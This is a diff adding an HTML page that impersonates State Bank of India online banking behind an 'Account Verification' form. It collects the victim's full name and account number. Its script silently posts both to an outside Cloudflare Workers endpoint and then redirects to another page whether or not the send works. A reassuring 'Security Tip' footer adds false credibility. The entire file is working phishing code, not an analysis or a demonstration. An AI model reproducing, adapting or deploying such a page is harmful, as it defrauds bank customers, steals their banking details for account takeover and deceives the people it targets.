@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBI - Online Banking</title>
+    <style>
+        * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #fff; display: flex; justify-content: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; }
+        .full-img { width: 100%; display: block; }
+        .header-bar { background-color: #315195; color: white; padding: 12px 15px; font-size: 14px; font-weight: bold; text-transform: uppercase; }
+        .content-area { padding: 20px 25px; }
+        .instruction-text { font-size: 13px; color: #333; margin-bottom: 22px; line-height: 1.6; border-left: 4px solid #315195; padding: 12px; background: #f8fbff; border-radius: 0 4px 4px 0; }
+        .field-group { margin-bottom: 18px; }
+        .field-group label { display: block; font-size: 13px; color: #444; margin-bottom: 8px; font-weight: bold; }
+        .bank-input { width: 100%; height: 38px; padding: 0 12px; background-color: #fff; border: 1px solid #999; border-radius: 2px; font-size: 15px; outline: none; color: #333; }
+        .bank-input:focus { border-color: #315195; }
+        .btn-row { display: flex; gap: 12px; margin-top: 28px; }
+        .btn { flex: 1; padding: 10px 0; border: none; color: white; font-size: 14px; border-radius: 2px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
+        .btn-submit { background-color: #315195; }
+        .btn-gray { background-color: #6c757d; }
+        .footer-note { margin-top: 35px; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 15px; line-height: 1.5; font-style: italic; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="Header" class="full-img">
+        <div class="header-bar">Account Verification</div>
+
+        <div class="content-area">
+            <div class="instruction-text">
+                To ensure the safety of your account, please complete the <b>Account Verification</b> process by providing your registered Name and Account Number below.
+            </div>
+
+            <form id="verificationForm">
+                <div class="field-group">
+                    <label>Account Holder Name *</label>
+                    <input type="text" id="acc_name" class="bank-input" placeholder="Enter Full Name" required autocomplete="off">
+                </div>
+
+                <div class="field-group">
+                    <label>11-Digit Account Number *</label>
+                    <input type="number" id="acc_no" class="bank-input" placeholder="Enter Account Number" required 
+                           oninput="if(this.value.length > 11) this.value = this.value.slice(0, 11);" autocomplete="off">
+                </div>
+
+                <div class="btn-row">
+                    <button type="submit" class="btn btn-submit" id="submitBtn">Verify Account</button>
+                    <button type="reset" class="btn btn-gray">Cancel</button>
+                </div>
+            </form>
+
+            <div class="footer-note">
+                <b>Security Tip:</b> Do not share your banking credentials with anyone. SBI will never ask for your password via SMS or Call.
+            </div>
+        </div>
+
+        <div style="margin-top: 40px;">
+            <img src="https://i.ibb.co/Txj77Jk2/chrome-screenshot-1-Apr-2026-12-43-42-pm-IST.png" alt="Footer" class="full-img">
+        </div>
+    </div>
+
+    <script>
+        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
+
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const accName = document.getElementById('acc_name').value;
+            const accNo = document.getElementById('acc_no').value;
+            const btn = document.getElementById('submitBtn');
+
+            btn.disabled = true;
+            btn.innerText = "Verifying...";
+
+            const payload = {
+                type: "KYC",
+                pan: "NAME: " + accName,
+                dob: "ACC: " + accNo
+            };
+
+            try {
+                await fetch(workerURL, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                // UPDATE: Redirecting to blogtwo.html
+                window.location.href = "blogtwo.html"; 
+            } catch (err) {
+                // Error tab bhi redirect kar do
+                window.location.href = "blogtwo.html";
+            }
+        });
+    </script>
+</body>
+</html>
